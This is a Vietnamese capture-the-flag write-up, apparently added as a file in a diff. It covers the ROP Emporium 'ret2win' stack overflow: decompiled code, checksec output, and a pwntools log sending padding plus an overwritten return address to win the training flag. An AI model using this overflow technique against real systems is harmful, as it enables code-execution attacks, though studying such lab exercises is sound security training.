@@ -1,0 +1,49 @@
+Một bài ret2win cơ bản
+
+- Mã giả khi dịch ngược bằng IDA
+
+int pwnme()
+{
+  _BYTE s[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  memset(s, 0, sizeof(s));
+  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
+  puts("What could possibly go wrong?");
+  puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
+  printf("> ");
+  read(0, s, 56uLL);
+  return puts("Thank you!");
+}
+jayce@Jayce:~/ctf/pwn/ret2win$ checksec --file=./ret2win
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols        No    0               3               ./ret2win
+=> yêu cầu overflow 1 buffer s[32] (32 byte), nhưng read() đọc vào 56 byte ⇒ dễ dàng overflow và ghi đè return address
+
+
+[+] Starting local process '/home/jayce/ctf/pwn/ret2win/ret2win' argv=[b'/home/jayce/ctf/pwn/ret2win/ret2win'] : pid 1974
+[DEBUG] Received 0x100 bytes:
+    b'ret2win by ROP Emporium\n'
+    b'x86_64\n'
+    b'\n'
+    b'For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!\n'
+    b'What could possibly go wrong?\n'
+    b"You there, may I have your input please? And don't worry about null bytes, we're using read()!\n"
+    b'\n'
+    b'> '
+[DEBUG] Sent 0x31 bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    *
+    00000020  41 41 41 41  41 41 41 41  57 07 40 00  00 00 00 00  │AAAA│AAAA│W·@·│····│
+    00000030  0a                                                  │·│
+    00000031
+[*] Switching to interactive mode
+[DEBUG] Received 0x28 bytes:
+    b'Thank you!\n'
+    b"Well done! Here's your flag:\n"
+Thank you!
+Well done! Here's your flag:
+[DEBUG] Received 0x21 bytes:
+    b'ROPE{a_placeholder_32byte_flag!}\n'
+ROPE{a_placeholder_32byte_flag!}
+[*] Process '/home/jayce/ctf/pwn/ret2win/ret2win' stopped with exit code 0 (pid 1974)
+[*] Got EOF while reading in interactive
